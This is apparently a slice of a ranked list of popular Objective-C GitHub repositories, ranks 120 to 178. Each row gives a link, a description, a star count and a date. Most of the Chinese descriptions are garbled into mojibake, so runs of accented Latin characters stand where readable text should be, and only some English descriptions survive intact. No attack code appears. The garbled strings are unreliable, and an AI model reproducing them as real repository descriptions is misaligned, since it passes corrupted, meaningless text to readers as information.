|120|[starrtc/starrtc-ios-demo](https://github.com/starrtc/starrtc-ios-demo)|üöÄstarRTCÔºåÂÖçË¥πIMÔºàÂê´ÂçïËÅäÔºåÁæ§ËÅäÔºåËÅäÂ§©ÂÆ§ÔºâÔºåÂÖçË¥π‰∏ÄÂØπ‰∏ÄËßÜÈ¢ëËÅäÂ§©ÔºàÂõûÈü≥Ê∂àÈô§ÔºâÔºåËØ≠Èü≥ËÅäÂ§©ÔºåÁõ¥Êí≠ËøûÈ∫¶ÔºåÁôΩÊùøÔºåÂ∞èÁè≠ËØæÔºåÂ§ö‰∫∫‰ºöËÆÆÔºåÂ±ÄÂüüÁΩëÊó†ÊúçÂä°Âô®Áõ¥ËøûÔºåÂÖºÂÆπwebRTC, ÊîØÊåÅwebRTCÂä†ÈÄüÔºåP2PÈ´òÊ∏Ö‰º†ËæìÔºåÂÆâÂçì„ÄÅiOS„ÄÅweb‰∫íÈÄöÔºåÊîØÊåÅÈó®Á¶ÅÂèØËßÜÂØπËÆ≤ÔºåÁîµËßÜÁõíÂ≠êÔºåÊ†ëËéìÊ¥æÔºåÊµ∑ÊÄùÔºåÂÖ®ÂøóÔºåOTTËÆæÂ§áÔºåCËØ≠Ë®ÄËá™Á†îÊñπÊ°àÔºå‚ú®‰∏áÊ∞¥ÂçÉÂ±±ÊÄªÊòØÊÉÖÔºåÊù•‰∏™starË°å‰∏çË°å‚ú®ÔºåÊõ¥Â§öÁ§∫‰æãËØ∑ËÆøÈóÆ|328|Objective-C|07/10|
|121|[wsl2ls/WKWebView](https://github.com/wsl2ls/WKWebView)|WKWebViewÁöÑ‰ΩøÁî®„ÄÅJSÂíåOCÁöÑ‰∫§‰∫í„ÄÅÁΩëÈ°µÂÜÖÂÆπÂä†ËΩΩËøõÂ∫¶Êù°ÁöÑÂÆûÁé∞„ÄÅWKWebView+UITableViewÊ∑∑Êéí „ÄÅ WKWebViewÁ¶ªÁ∫øÁºìÂ≠ò|327|Objective-C|06/18|
|122|[liangdahong/UITableViewDynamicLayoutCacheHeight](https://github.com/liangdahong/UITableViewDynamicLayoutCacheHeight)|üññÈ´òÊÄßËÉΩÁöÑËá™Âä®ËÆ°ÁÆóÈááÁî® Autolayout Â∏ÉÂ±ÄÁöÑ UITableViewCell Âíå UITableViewHeaderFooterView ÁöÑÈ´òÂ∫¶ÔºåÂÜÖÈÉ®Ëá™Âä®ÁÆ°ÁêÜÈ´òÂ∫¶ÁºìÂ≠ò„ÄÇ|327|Objective-C|10/09|
|123|[zhifenx/JFCitySelector](https://github.com/zhifenx/JFCitySelector)|ËΩªÈáè„ÄÅÁÅµÊ¥ª„ÄÅÂèØËá™ÂÆö‰πâÁöÑ‰∏âÁ∫ßÂüéÂ∏ÇÈÄâÊã©Âô®|326|Objective-C|07/30|
|124|[ArchLL/HGPersonalCenterExtend](https://github.com/ArchLL/HGPersonalCenterExtend)|Ëß£ÂÜ≥UIScrollViewÂµåÂ•óÊªëÂä®ÊâãÂäøÂÜ≤Á™ÅÈóÆÈ¢òÔºåÈÄÇÁî®‰∫éÂ§çÊùÇÁöÑÈ¶ñÈ°µÊàñ‰∏™‰∫∫‰∏ªÈ°µ|326|Objective-C|08/15|
|125|[yuping1989/YPTabBarController](https://github.com/yuping1989/YPTabBarController)|ÂäüËÉΩÂº∫Â§ßÔºå‰ΩøÁî®Êñπ‰æøÔºåÂèØÈ´òÂ∫¶Ëá™ÂÆö‰πâÁöÑTabBarController„ÄÇ|325|Objective-C|09/18|
|126|[reactnativecomponent/react-native-chat-demo](https://github.com/reactnativecomponent/react-native-chat-demo)|ÁΩëÊòì‰∫ë‰ø°IMÁ§∫‰æã|323|Objective-C|10/17|
|127|[Dzhijian/ZJKitTool](https://github.com/Dzhijian/ZJKitTool)|iOSÂºÄÂèëÂø´ÈÄüÊ∑ªÂä†UIKitÊéß‰ª∂ÂèØ‰ª•ÁªìÂêàMasonryÔºåÈìæÂºèËØ≠Ê≥ïÔºå‰ª•ÂèäÂÖ∂‰ªñÂ∑•ÂÖ∑Á±ªÁöÑÁÆÄÂçï‰ΩøÁî®,ËØÑËÆ∫ÂàóË°®„ÄÅÁÄëÂ∏ÉÊµÅ„ÄÅÂéãÁº©ÂõæÁâá„ÄÅÂÄíËÆ°Êó∂„ÄÅÁ≠õÈÄâ„ÄÅ Ëá™ÂÆö‰πâPickerView Êó∂Èó¥Êó•ÊúüÈÄâÊã©Âô®„ÄÅÊÄßÂà´ÈÄâÊã©Âô®„ÄÅWKWebView ÁöÑÂ∫îÁî®Ôºå‰∏çÊñ≠Êõ¥Êñ∞‰∏≠„ÄÇ„ÄÇ„ÄÇ„ÄÇ|321|Objective-C|04/08|
|128|[FantasticLBP/Hotels](https://github.com/FantasticLBP/Hotels)|ÈÖíÂ∫óÈ¢ÑËÆ¢App|320|Objective-C|09/06|
|129|[boai/BANetManager](https://github.com/boai/BANetManager)|Âü∫‰∫éAFNetworking 3.0„ÄÅ3.1ÊúÄÊñ∞ÁâàÊú¨ÁöÑÂ∞ÅË£ÖÔºåÈõÜÊàê‰∫Ü get / post / put / delete ÊñπÊ≥ïËØ∑Ê±ÇÊï∞ÊçÆÔºåÂçïÂõæ/Â§öÂõæ‰∏ä‰º†ÔºåËßÜÈ¢ë‰∏ä‰º†/‰∏ãËΩΩÔºåÁΩëÁªúÁõëÊµã Á≠âÂ§öÁßçÁΩëÁªúËØ∑Ê±ÇÊñπÂºèÔºå|319|Objective-C|05/11|
|130|[Soulghost/SGWiFiUpload](https://github.com/Soulghost/SGWiFiUpload)|Upload files through WiFi. ÈÄöËøáWiFi‰∏ä‰º†Êñá‰ª∂|315|Objective-C|03/08|
|131|[donggelaile/HDCollectionView](https://github.com/donggelaile/HDCollectionView)|An efficient and flexible listView (data driven). Based on Flexbox, it supports floating, waterfall, decorative view, horizontal sliding, segmented layout, and various alignments. Support diff refresh, animation update UI  /  Êï∞ÊçÆÈ©±Âä®(data driven)ÁöÑÈ´òÊïàÁÅµÊ¥ªÂàóË°®„ÄÇÂü∫‰∫éFlexboxÔºåÊîØÊåÅ ÊÇ¨ÊµÆ„ÄÅÁÄëÂ∏ÉÊµÅ„ÄÅË£ÖÈ•∞view„ÄÅÊ®™ÂêëÊªëÂä®„ÄÅÂàÜÊÆµÂ∏ÉÂ±Ä„ÄÅÂêÑÁßçÂØπÈΩêÊñπÂºè„ÄÇÊîØÊåÅÈìæÂºèËØ≠ ...|314|Objective-C|08/31|
|132|[wwmz/WMZPageController](https://github.com/wwmz/WMZPageController)|ÂàÜÈ°µÊéßÂà∂Âô®,ÊõøÊç¢UIPageControllerÊñπÊ°à,ÂÖ∑Â§áÂÆåÊï¥ÁöÑÁîüÂëΩÂë®Êúü,Â§öÁßçÊåáÁ§∫Âô®Ê†∑Âºè,Â§öÁßçÊ†áÈ¢òÊ†∑Âºè,ÂèØÊÇ¨ÊµÆ,ÊîØÊåÅios13ÊöóÈªëÊ®°Âºè(‰ªø‰ºòÈÖ∑,Áà±Â•áËâ∫,‰ªäÊó•Â§¥Êù°,ÁÆÄ‰π¶,‰∫¨‰∏úÁ≠âÂ§öÁßçÊ†áÈ¢òËèúÂçï) (Pagination controller with full life cycle, multiple indicator styles, multiple title styles)|313|Objective-C|10/22|
|133|[wubianxiaoxian/PureCamera-Demo](https://github.com/wubianxiaoxian/PureCamera-Demo)|‰∏Ä‰∏™Ëá™ÂÆö‰πâÁõ∏Êú∫ÔºåÊãçÁÖßÂÆåÊï¥ÂèØ‰ª•Ëá™Áî±Ë£ÅÂâ™|308|Objective-C|05/14|
|134|[dev-liyang/LYCustomTransition](https://github.com/dev-liyang/LYCustomTransition)|iOSËá™ÂÆö‰πâ‰∫§‰∫íÂºèËΩ¨Âú∫Âä®Áîª-‰ªøÂæÆ‰ø°ÂõæÁâáÊµèËßàÂô®ËΩ¨Âú∫Âä®Áîª„ÄÅ‰ªøiOSÁ≥ªÁªüÁõ∏ÂÜåÂõæÁâáÊµèËßàËΩ¨Âú∫Âä®Áîª„ÄÅ‰ªøÈÖ∑ÁãóËΩ¨Âú∫Âä®Áîª + ‰∫§‰∫íÂºèÂõæÁâáÊµèËßàÂô®|306|Objective-C|06/23|
|135|[wsl2ls/WSLWaterFlowLayout](https://github.com/wsl2ls/WSLWaterFlowLayout)|ÂäüËÉΩÊèèËø∞ÔºöWSLWaterFlowLayout ÊòØÂú®ÁªßÊâø‰∫éUICollectionViewLayoutÁöÑÂü∫Á°Ä‰∏äÂ∞ÅË£ÖÁöÑÊéß‰ª∂Ôºå ÁõÆÂâçÊîØÊåÅÁ´ñÂêëÁÄëÂ∏ÉÊµÅ(itemÁ≠âÂÆΩ‰∏çÁ≠âÈ´ò„ÄÅÊîØÊåÅÂ§¥ËÑöËßÜÂõæ)„ÄÅÊ∞¥Âπ≥ÁÄëÂ∏ÉÊµÅ(itemÁ≠âÈ´ò‰∏çÁ≠âÂÆΩ ‰∏çÊîØÊåÅÂ§¥ËÑöËßÜÂõæ)„ÄÅÁ´ñÂêëÁÄëÂ∏ÉÊµÅ( itemÁ≠âÈ´ò‰∏çÁ≠âÂÆΩ„ÄÅÊîØÊåÅÂ§¥ËÑöËßÜÂõæ)„ÄÅÊ†ÖÊ†ºÂ∏ÉÂ±ÄÁÄëÂ∏ÉÊµÅ 4ÁßçÊ†∑ÂºèÁöÑÁÄëÂ∏ÉÊµÅÂ∏ÉÂ±Ä„ÄÇ|299|Objective-C|04/07|
|136|[hydreamit/HyCharts](https://github.com/hydreamit/HyCharts)|Êü±Áä∂Âõæ„ÄÅÊäò/Êõ≤Á∫øÂõæ„ÄÅKÁ∫øÂõæÔºà‰∏ªÂõæ„ÄÅ‰∫§ÊòìÈáèÂõæ„ÄÅËæÖÂä©Âõæ),  Âõæ‰∏éÂõæÂèØ‰ª•Ëá™Áî±ÁªÑÂêà -----> ‰ΩéÂÜÖÂ≠ò„ÄÅ‰ΩéËÄóÁîµ„ÄÅÊªëÂä®Áº©ÊîæÈ°∫ÁïÖ|292|Objective-C|10/29|
|137|[LoongerTao/TLTransitions](https://github.com/LoongerTao/TLTransitions)|Âø´ÈÄüÂÆûÁé∞ÊéßÂà∂Âô®ÁöÑËΩ¨Âú∫ÂíåViewÁöÑÂø´ÈÄüpopoverÊòæÁ§∫ÔºåÂπ∂ÊîØÊåÅËá™ÂÆö‰πâÂä®Áîª„ÄÅÊâãÂäøÈÄÄÂú∫|291|Objective-C|03/27|
|138|[pro648/BasicDemos-iOS](https://github.com/pro648/BasicDemos-iOS)|iOSÂ≠¶‰π†ËøõÁ®ã‰∏≠ÁöÑdemoÊ±áÊÄª|290|Objective-C|10/22|
|139|[JmoVxia/CLPlayer](https://github.com/JmoVxia/CLPlayer)|Ëá™ÂÆö‰πâËßÜÈ¢ëÊí≠ÊîæÂô®|285|Objective-C|04/30|
|140|[remember17/WHKit](https://github.com/remember17/WHKit)|ÂàÜÁ±ªÂ∞èÈõÜÂêà|281|Objective-C|08/21|
|141|[mengxianliang/XLPageViewController](https://github.com/mengxianliang/XLPageViewController)|‰∏Ä‰∏™ÂºÄÊîæ„ÄÅÈ´òÂ∫¶ÂèØÂÆöÂà∂ÂåñÁöÑÂàÜÈ°µËßÜÂõæÊéßÂà∂Âô®|280|Objective-C|09/08|
|142|[jiaxiaogang/he4o](https://github.com/jiaxiaogang/he4o)|ÂíåÔºàhe for objective-cÔºâ ‚Äî‚Äî ‚Äú‰ª•Ëû∫ÊóãËÆ∫‰∏∫Âü∫Á°ÄÂºÄÂèëÁöÑ‰ø°ÊÅØÁÜµÂáèÊú∫‚Äù|279|Objective-C|10/27|
|143|[mediaios/net-diagnosis](https://github.com/mediaios/net-diagnosis)|iosÂπ≥Âè∞ÁΩëÁªúËØäÊñ≠SDKÔºåÊîØÊåÅÂØπipÂíåÂüüÂêçÁöÑping,traceroute(udp,icmpÂçèËÆÆ)ÔºåÊîØÊåÅtcp ping, Á´ØÂè£Êâ´ÊèèÔºånslookup,Â±ÄÂüüÁΩëÊ¥ªË∑ÉipÊâ´ÊèèÁ≠âÂäüËÉΩ-----------Ios platform network diagnostic SDK, support ip and domain name ping, traceroute (udp, icmp protocol), support tcp ping, port scan, nslookup, LAN active ip scan and other functions|275|Objective-C|05/21|
|144|[puti94/react-native-puti-pay](https://github.com/puti94/react-native-puti-pay)|Âü∫‰∫é React Native ÁöÑÂæÆ‰ø°ÊîØ‰ªòÔºåÊîØ‰ªòÂÆùÊîØ‰ªòÊèí‰ª∂|272|Objective-C|09/04|
|145|[indulgeIn/YBTaskScheduler](https://github.com/indulgeIn/YBTaskScheduler)|iOS ‰ªªÂä°Ë∞ÉÂ∫¶Âô®Ôºå‰∏∫ CPU ÂíåÂÜÖÂ≠òÂáèË¥üÔºàÁî®‰∫éÊÄßËÉΩ‰ºòÂåñÔºâ|266|Objective-C|04/03|
|146|[changsanjiang/SJFullscreenPopGesture](https://github.com/changsanjiang/SJFullscreenPopGesture)|Fullscreen pop gesture. OC&Swift. It is very suitable for the application of the video player. Support `cocoapods`.  Âè™ÈúÄ`pod`Âç≥ÂèØËá™Â∏¶ÂÖ®Â±èËøîÂõûÊâãÂäø. ÊîØÊåÅpod. ÊîØÊåÅOC&Swift.|266|Objective-C|07/29|
|147|[LuKane/KNPhotoBrowser](https://github.com/LuKane/KNPhotoBrowser)|üì∑  ÂõæÁâá    ËßÜÈ¢ë ÊµèËßàÂô®(Êú¨Âú∞ÂíåÁΩëÁªú) , UIViewController + CollectionView  , ÂÆåÁæéÈÄÇÈÖç iPhone ‰ª•Âèä iPad ,Â±èÂπïÊóãËΩ¨ÂäüËÉΩ , ÈÄÇÈÖçSDWebImage 5.0|262|Objective-C|10/27|
|148|[HatsuneMikuV/SHSegmentedControlTableView](https://github.com/HatsuneMikuV/SHSegmentedControlTableView)|Both scroll horizontal and vertical for segment scrollview which have a same header. ‚Äî Á±ª‰ººÂçäÁ≥ñ„ÄÅÁæé‰∏ΩËØ¥‰∏ªÈ°µ‰∏éQQÈü≥‰πêÊ≠åÊõ≤ÂàóË°®Â∏ÉÂ±ÄÊïàÊûúÔºåÂÆûÁé∞‰∏çÂêåËèúÂçïÁöÑÂ∑¶Âè≥ÊªëÂä®ÂàáÊç¢ÔºåÂêåÊó∂ÊîØÊåÅÁ±ª‰ººtableviewÁöÑÈ°∂ÈÉ®Â∑•ÂÖ∑Ê†èÊÇ¨ÂÅúÔºàÊó¢ÂèØ‰ª•Â∑¶Âè≥ÊªëÂä®ÔºåÂèàÂèØ‰ª•‰∏ä‰∏ãÊªëÂä®Ôºâ„ÄÇÂÖºÂÆπ‰∏ãÊãâÂà∑Êñ∞Ôºå‰∏äÊãâÂä†ËΩΩÊõ¥Â§ö„ÄÇÁé∞Â∑≤Âä†ÂÖ•swiftË±™ÂçéÂ•óÈ§êÔºå‰ΩøÁî®Ê†∑‰æãÂä©‰Ω†Âø´ÈÄü‰ΩøÁî®|251|Objective-C|04/15|
|149|[zhengwenming/RCIM](https://github.com/zhengwenming/RCIM)|Ëûç‰∫ëSDKÈõÜÊàêÂç≥Êó∂ÈÄöËÆØ„ÄÇÂçïËÅäÔºåÁæ§ËÅäÔºåËÆ®ËÆ∫ÁªÑÔºåËá™ÂÆö‰πâcell,Ëá™ÂÆö‰πâÊ∂àÊÅØÁ≠âÔºåËûç‰∫ëDemo„ÄÇÊñáÁ´†ÈÖçÂêà‰ª£Á†Å‰∏ÄËµ∑ÁúãÔºåÊïàÊûúÊõ¥‰Ω≥ÔºÅÊñáÁ´†Âú∞ÂùÄÔºöhttps://github.com/zhengwenming/RongCloud-SDK-description|250|Objective-C|03/30|
|150|[ripperhe/Debugo](https://github.com/ripperhe/Debugo)|‰∏Ä‰∏™ÂèØËÉΩÊúâÁÇπÁî®ÁöÑ iOS Ë∞ÉËØïÂ∑•ÂÖ∑~|246|Objective-C|08/04|
|151|[liuf1986/LFRtmp](https://github.com/liuf1986/LFRtmp)|‰∏Ä‰∏™ÂÖ®ÂºÄÊ∫êÁöÑÁ∫ØOCÂÆûÁé∞ÁöÑRTMPÊé®ÊµÅSDKÊîØÊåÅAAC„ÄÅH264„ÄÅÁæéÈ¢úÊª§Èïú„ÄÅAMFÁºñËß£Á†Å„ÄÇ|246|Objective-C|03/16|
|152|[netyouli/WHC_Model](https://github.com/netyouli/WHC_Model)|iOSÂπ≥Âè∞È´òÊïàËΩ¨Êç¢ÂºïÊìéjson->model,model->json,model->Dictionary,ÊîØÊåÅÊ®°ÂûãÁ±ªÁªßÊâøÂÖ∂‰ªñÊ®°ÂûãÁ±ª,ÊîØÊåÅÊåáÂÆöË∑ØÂæÑËΩ¨Êç¢,‰∏çÂå∫ÂàÜjsonÁöÑkeyÂíåÊ®°ÂûãÂ±ûÊÄßÂêçÁß∞Â§ßÂ∞èÂÜô,Ëá™Âä®Â§ÑÁêÜjson‰∏≠null|242|Objective-C|05/31|
|153|[czl620/UFKit](https://github.com/czl620/UFKit)|Âø´ÈÄüÈõÜÊàêË°®ÂçïForm|241|Objective-C|10/16|
|154|[amisare/NNNavigationBar](https://github.com/amisare/NNNavigationBar)|NNNavigationBar ÂÆûÁé∞ÂØºËà™Êù°ËÉåÊôØÊ∏êÂèòËøáÊ∏°Âä®ÁîªÁöÑËΩªÈáèÁ∫ßÊ°ÜÊû∂|239|Objective-C|02/25|
|155|[CrabMen/CMPageTitleView](https://github.com/CrabMen/CMPageTitleView)|‚úçÔ∏è‰∏ÄÂàÜÈíüÈõÜÊàêÁ±ª‰ººÊäñÈü≥ÔºåÊñ∞Êµ™ÂæÆÂçöÔºåËÖæËÆØËßÜÈ¢ëÔºåÁΩëÊòìÊñ∞ÈóªÔºå‰ªäÊó•Â§¥Êù°Á≠âÂ∏∏ËßÅÁöÑÊ†áÈ¢òÊ†èÊ†∑ÂºèÔºåapiÁÅµÊ¥ªÊòìÊâ©Â±ïÔºåÊîØÊåÅCocoapodsÂíåMasonryÂ∏ÉÂ±ÄÔºåÊîØÊåÅChildControllerÁöÑÂÆåÊï¥ÁîüÂëΩÂë®Êúü|237|Objective-C|10/29|
|156|[HawkEleven/UITableViewLinkageDemo](https://github.com/HawkEleven/UITableViewLinkageDemo)|iOSÈááÁî®UITableViewÊù•ÂÆûÁé∞Excel„ÄÅËØæÁ®ãË°®„ÄÅÊ±ΩËΩ¶‰πãÂÆ∂ËΩ¶ËæÜÂèÇÊï∞ÂØπÊØîÁöÑ‰∏ä‰∏ãÂ∑¶Âè≥ËÅîÂä®ÊïàÊûú|229|Objective-C|02/24|
|157|[HouWan/CodeTextDemo](https://github.com/HouWan/CodeTextDemo)|iOSÈ™åËØÅÁ†ÅËæìÂÖ•|225|Objective-C|08/29|
|158|[JC-Hu/JHCellConfig](https://github.com/JC-Hu/JHCellConfig)|ÈÄÇÁî®‰∫éUITableViewÁöÑ‚ÄúËùáÈáèÁ∫ß‚ÄùÊ°ÜÊû∂„ÄÇ Â∞Ü‰∏öÂä°Â§çÊùÇÂ∫¶ÈõÜ‰∏≠ÔºåÂáèÂ∞ë‰ª£Á†ÅÈáèÔºåÊèêÈ´òÂèØÈòÖËØªÊÄß„ÄÇ  Êú¨Á±ªÁöÑÊÄùÊÉ≥ÔºåÊòØÂ∞ÜtableView‰∏≠cellÁöÑÁõ∏ÂÖ≥ÈÄªËæëÈõÜ‰∏≠Ëµ∑Êù•Ôºå ÊîæÂà∞Êï∞ÁªÑ‰∏≠ÁÆ°ÁêÜÔºåËÄå‰∏çÊòØÂ∞Ü‰∏öÂä°ÈÄªËæëÂàÜÊï£Âú®ÂêÑ‰∏™‰ª£ÁêÜÊñπÊ≥ï‰∏≠„ÄÇ ÁâπÂà´ÊòØ‰ΩøÁî®Âü∫Á±ªBaseTableViewControllerËøõË°åËΩ¨Êé•ÂêéÔºå ÂÖ∑‰Ωì‰∏öÂä°vc‰∏çÈúÄË¶ÅÂÆûÁé∞tableView cellÁõ∏ÂÖ≥ÁöÑ‰ª£ÁêÜÊñπÊ≥ï|224|Objective-C|02/22|
|159|[JmoVxia/CLDemo](https://github.com/JmoVxia/CLDemo)|ËøôÊòØ‰∏Ä‰∏™DemoÁ©∫Èó¥ÔºåÊåÅÁª≠Êõ¥Êñ∞|223|Objective-C|10/20|
|160|[doubleYang1020/DYVideoCamera](https://github.com/doubleYang1020/DYVideoCamera)|DYVideoCamera ÊòØ‰∏Ä‰∏™ÈÄÇÁî®‰∫é iOS ËßÜÈ¢ëÂΩïÂà∂ÁªÑ‰ª∂,ÂèØÈ´òÂ∫¶ÂÆöÂà∂ÂåñÂíå‰∫åÊ¨°ÂºÄÂèë,ÁâπËâ≤ÊòØÊîØÊåÅËá™ÂÆö‰πâ ÊØîÁâπÁéá, Êª§Èïú, Ë£ÅÂâ™, Èü≥‰πê, ËØïÂê¨Èü≥‰πêÂÆûÊó∂ÁºìÂ≠ò„ÄÇ|215|Objective-C|04/17|
|161|[iodefog/VipVideo-iPhone](https://github.com/iodefog/VipVideo-iPhone)|iPhone ÂêÑÂ§ßÁΩëÁ´ôvipËßÜÈ¢ëÂÖçË¥πËßÇÁúãÁ≠â„ÄÇ‰ªòË¥πÁîµÂΩ±ÔºåVIP‰ºöÂëòÂâßÁ≠âÔºåÂéªÂπøÂëäÊí≠Êîæ.|214|Objective-C|06/19|
|162|[wwmz/WMZBanner](https://github.com/wwmz/WMZBanner)|ÊúÄÂ•ΩÁî®ÁöÑËΩªÈáèÁ∫ßËΩÆÊí≠Âõæ+Âç°ÁâáÊ†∑Âºè+Ëá™ÂÆö‰πâÊ†∑Âºè,ÈìæÂºèÁºñÁ®ãËØ≠Ê≥ï(ÂèØÂÆûÁé∞ÂêÑÁßçÊ†∑ÂºèÁöÑËΩÆÊí≠Âõæ,Â§ßÂ§öÈúÄË¶ÅÁöÑÂäüËÉΩÈÉΩÊúâ)(The best lightweight carousel + card style + custom style, chain programming syntax)|214|Objective-C|09/23|
|163|[baozoudiudiu/CWCarousel](https://github.com/baozoudiudiu/CWCarousel)|ËΩÆÊí≠Âõæbanner|213|Objective-C|09/27|
|164|[SmileZXLee/ZXHookDetection](https://github.com/SmileZXLee/ZXHookDetection)|„ÄêiOSÂ∫îÁî®ÂÆâÂÖ®„ÄÅÂÆâÂÖ®ÊîªÈò≤„ÄëhookÂèäË∂äÁã±ÁöÑÂü∫Êú¨Èò≤Êä§‰∏éÊ£ÄÊµã(Âä®ÊÄÅÂ∫ìÊ≥®ÂÖ•Ê£ÄÊµã„ÄÅhookÊ£ÄÊµã‰∏éÈò≤Êä§„ÄÅË∂äÁã±Ê£ÄÊµã„ÄÅÁ≠æÂêçÊ†°È™å„ÄÅIDAÂèçÁºñËØëÂàÜÊûêÂä†ÂØÜÂçèËÆÆDemo)Ôºõ„ÄêÊï∞ÊçÆ‰º†ËæìÂÆâÂÖ®„ÄëÊµÖË∞àhttp„ÄÅhttps‰∏éÊï∞ÊçÆÂä†ÂØÜ|211|Objective-C|06/05|
|165|[lincf0912/LFImagePickerController](https://github.com/lincf0912/LFImagePickerController)|‰∏Ä‰∏™ÊîØÊåÅÂ§öÈÄâÂõæÁâáÂíåËßÜÈ¢ëÁöÑÂõæÁâáÈÄâÊã©Âô®ÔºåÂêåÊó∂ÊúâÈ¢ÑËßà„ÄÅÁºñËæëÂäüËÉΩ|209|Objective-C|10/13|
|166|[ArchLL/HGPersonalCenter](https://github.com/ArchLL/HGPersonalCenter)|‰∏ªË¶ÅÂÆûÁé∞Â§¥ÈÉ®ËßÜÂõæÁöÑ‰∏ãÊãâÊîæÂ§ß‰ª•ÂèäÂàÜÈ°µÊéßÂà∂ÔºåÂêåÊ†∑ÁöÑÂú∫ÊôØ‰πüÈÄÇÁî®‰∫éÊ∑òÂÆù/Â§©Áå´Â∫óÈì∫ÁïåÈù¢/ÁÆÄ‰π¶‰∏ªÈ°µ/ÂæÆÂçö‰∏ªÈ°µ|208|Objective-C|08/15|
|167|[Faceunity/FULiveDemo](https://github.com/Faceunity/FULiveDemo)|Faceunity Èù¢ÈÉ®Ë∑üË∏™ÂíåËôöÊãüÈÅìÂÖ∑ SDK Âú® iOS Âπ≥Âè∞‰∏≠ÁöÑÈõÜÊàê Demo|207|Objective-C|09/29|
|168|[huanglins/VHLNavigation](https://github.com/huanglins/VHLNavigation)|ÂØºËà™Ê†èÂàáÊç¢‰πãÈ¢úËâ≤ËøáÊ∏°ÂàáÊç¢ÔºåÂØºËà™Ê†èËÉåÊôØÂõæÁâáÂàáÊç¢ÔºåÂæÆ‰ø°Á∫¢ÂåÖ‰∏§Áßç‰∏çÂêåÈ¢úËâ≤ÂàáÊç¢ÔºåÂØºËà™Ê†èÈÄèÊòéÂ∫¶ÔºåÊúâÊó†ÂØºËà™Ê†èÂàáÊç¢|206|Objective-C|06/18|
|169|[nijino/CircularProgressView](https://github.com/nijino/CircularProgressView)|An audio circular progress view for iOS.You can customize its frame,background circle color & progress circle color,circle width as you wish. ‰∏Ä‰∏™iOSÂúÜÂΩ¢ËøõÂ∫¶Êù°ÂºÄÊ∫êÂ∫ìÔºå‰Ω†ÂèØ‰ª•ÂÆöÂà∂ÂÆÉÁöÑÂ§ßÂ∞è„ÄÅËøõÂ∫¶Êù°ËÉåÊôØËâ≤ÂíåÂâçÊôØËâ≤‰ª•ÂèäËøõÂ∫¶Êù°ÁöÑÂÆΩÂ∫¶„ÄÇ|202|Objective-C|08/19|
|170|[GitWangKai/WKJavaScriptBridge](https://github.com/GitWangKai/WKJavaScriptBridge)|‰∏ÄÊ¨æÂü∫‰∫éWKWebViewÊûÑÂª∫ÁöÑJSBridgeÊ°ÜÊû∂ÔºåÊèí‰ª∂ÂåñÈõÜÊàêÔºå‰∏ÄË°å‰ª£Á†ÅÂç≥ÂèØ‰ΩøÁî®ÔºåÊîØÊåÅiOS8+„ÄÇ|201|Objective-C|09/14|
|171|[chenfengxiaoxixi/OnlineShopDemo](https://github.com/chenfengxiaoxixi/OnlineShopDemo)|ÁîµÂïÜÈ°πÁõÆdemoÔºåÂåÖÊã¨Ë¥≠Áâ©ËΩ¶Âä®ÁîªÔºåheader‰º∏Áº©Âä®ÁîªÔºå‰ªø‰∫¨‰∏úËØ¶ÊÉÖÁïåÈù¢Á≠âÂ§öÁßçÁõÆÂâçÊØîËæÉÂ∏∏ËßÅÁöÑÂ∏ÉÂ±ÄÂèäÂä®ÁîªÊºîÁ§∫|200|Objective-C|05/10|
|172|[dgynfi/WeChat_tweak](https://github.com/dgynfi/WeChat_tweak)|‚ô®Ô∏è iOSÁâàÂäüËÉΩÊúÄÂÖ®ÁöÑÂæÆ‰ø°Êèí‰ª∂ÔºåÊîØÊåÅÊúÄÊñ∞ÁâàÂæÆ‰ø°ÔºåÂÖ∑Â§áËá™Âä®Êä¢Á∫¢ÂåÖÔºåÂ±èËîΩÊ∂àÊÅØÂíåÁæ§Ê∂àÊÅØÔºåËøáÊª§ÁâπÂÆöÁöÑÁæ§ËÅäÔºåÈò≤Ê≠¢Êí§ÂõûÊ∂àÊÅØÔºå‰º™ÂÆö‰Ωç (ÊúãÂèãÂúàÂíåÈôÑËøëÁöÑ‰∫∫)Ôºå‰øÆÊîπÂæÆ‰ø°ËøêÂä®Ê≠•Êï∞ÂíåÂÆûÊó∂ÂèñÊôØÂÅöËÅäÂ§©È°µÁöÑËÉåÊôØÁ≠âÂäüËÉΩ„ÄÇ|197|Objective-C|08/23|
|173|[luckyxiangfeng/ZMCommentView](https://github.com/luckyxiangfeng/ZMCommentView)|ÂèØÊâ©Â±ï„ÄÅÂèØÂçïÁã¨ÂàÜÁ¶ª‰ΩøÁî®ÁöÑÂºπÂá∫ÂºèËØÑËÆ∫ÂàóË°®Ôºå‰∏ÄËà¨Áî®‰∫éÊü•ÁúãÂÖ®ÈÉ®ËØÑËÆ∫Ôºå‰ªÖÂºïÂÖ•‰∫ÜMasonryÂÅöÂ∏ÉÂ±Ä|195|Objective-C|03/24|
|174|[peaktangf/RecognizeCard](https://github.com/peaktangf/RecognizeCard)|ÊàëÊòØ‰∏Ä‰∏™ËÉΩËØÜÂà´‰∏≠ÂõΩ‰∫å‰ª£Ë∫´‰ªΩËØÅÁöÑDemo|193|Objective-C|08/01|
|175|[seniverse/seniverse-api-demos](https://github.com/seniverse/seniverse-api-demos)|ÂøÉÁü•Â§©Ê∞î API ‰∫ßÂìÅ‰ΩøÁî®Ë∞ÉÁî®Á§∫‰æã|187|Objective-C|05/26|
|176|[CoderFM/FMLayoutKit](https://github.com/CoderFM/FMLayoutKit)|Ëá™ÂÆö‰πâCollectionViewÁöÑÂ∏ÉÂ±ÄÔºåÂèØ‰ª•Âø´ÈÄüÂÆûÁé∞ÁÄëÂ∏ÉÊµÅÔºåÊ†áÁ≠æÂ∏ÉÂ±ÄÔºåÂïÜÂìÅËØ¶ÊÉÖÔºåÂêÑÁßçÁîµÂïÜÈ¶ñÈ°µÁ≠âÔºåÊÇ¨ÂÅúÔºåÊãñÊãΩÊéíÂ∫èÁ≠âÁ≠âÂäüËÉΩ‰∏∞ÂØåÔºåÂèØ‰ª•Á©øÊèíÂ∏ÉÂ±ÄÔºàÂûÇÁõ¥Ê∞¥Âπ≥ÔºâÔºåÂ§öÁßçÂ∏ÉÂ±ÄÊ†∑ÂºèËÆ©‰Ω†‰∏ìÊ≥®‰∏öÂä°|186|Objective-C|09/15|
|177|[yuenov/reader-ios](https://github.com/yuenov/reader-ios)|ÈòÖÂ∞èËØ¥iOSÂÆ¢Êà∑Á´ØÊ∫êÁ†Å|186|Objective-C|06/04|
|178|[lmf12/blog-demo](https://github.com/lmf12/blog-demo)|ÂçöÂÆ¢‰∏≠ÁöÑdemo|183|Objective-C|10/10|
